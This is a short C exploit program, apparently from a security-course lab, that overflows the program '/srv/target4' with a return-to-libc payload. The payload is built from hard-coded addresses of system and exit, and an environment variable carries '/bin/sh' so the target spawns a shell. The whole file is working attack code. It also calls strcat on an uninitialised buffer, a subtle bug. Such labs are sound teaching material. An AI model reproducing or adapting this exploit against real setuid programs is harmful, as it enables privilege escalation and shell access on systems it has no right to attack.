#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/srv/target4"

int main(void)
{
  char *args[3]; 
  char *env[1];

  // p system: 0xf7e14360
  // p exit: 0xf7e06ec0
  // env[0]:  0xffffdfbe

  char payload[20];
  strcat(payload, "\x60\x43\xe1\xf7");
  strcat(payload, "\x60\x43\xe1\xf7");
  strcat(payload, "\x60\x43\xe1\xf7");
  strcat(payload, "\xc0\x6e\xe0\xf7");
  strcat(payload, "\xc1\xdf\xff\xff");
  
  args[0] = TARGET;
  args[1] = payload; 
  args[2] = NULL;
  
  env[0] = "SC=/bin/sh";
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


